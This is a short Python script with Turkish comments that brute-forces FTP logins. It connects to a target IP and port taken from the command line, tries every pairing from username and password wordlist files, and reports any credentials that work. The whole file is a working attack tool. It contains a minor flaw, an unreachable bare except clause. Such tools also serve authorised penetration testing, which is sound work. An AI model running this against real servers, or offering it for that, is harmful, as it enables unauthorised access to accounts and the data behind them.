#!/usr/bin/env python3
import sys
from ftplib import FTP
import reconf
from reconf import *

# Kullanıcı adı ve şifre listelerini dosyadan oku
def load_list(file_path):
    with open(file_path, "r") as file:
        return [line.strip() for line in file.readlines()]

# FTP ile giriş yapmayı dene
def ftp_brute_force(target_ip, target_port, usernames, passwords):
    ftp = FTP()
    ftp.set_debuglevel(0)  # Debug seviyesini kapat

    # Kullanıcı adı ve şifre denemeleri
    for username in usernames:
        for password in passwords:
            try:
                print(f"[*] Deneniyor: {username} / {password}")
                ftp.connect(target_ip, target_port)  # Bağlantı kur
                ftp.login(username, password)  # Giriş yapmayı dene
                print(f"[+] Başarıyla Bağlandı: {username} / {password}")
                ftp.quit()  # Başarıyla bağlandıysa bağlantıyı kes
                return  # Başarılı giriş sonrası çık
            except Exception as e:
                print(f"[-] Hatalı Şifre: {username} / {password}")
                ftp.close()  # Bağlantıyı kapat, yeniden denemek için
            except:
                print("[-] Bir hata oluştu.")
    print("[-] Hiçbir şifre çalışmadı.")

# Ana fonksiyon çalıştır
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Kullanım: brute_ftp.py <Hedef_IP> <Port>")
        sys.exit(0)

    # Komut satırından IP ve port al
    ip_address = sys.argv[1]
    port = int(sys.argv[2])  # Portu int olarak al

    # Kullanıcı adı ve şifre dosyalarını oku
    usernames = load_list("modules/wordlists/usernames.txt")  # Kullanıcı adı listesi
    passwords = load_list("modules/wordlists/ssh_passwd.txt")  # Şifre listesi

    # FTP brute force saldırısını başlat
    ftp_brute_force(ip_address, port, usernames, passwords)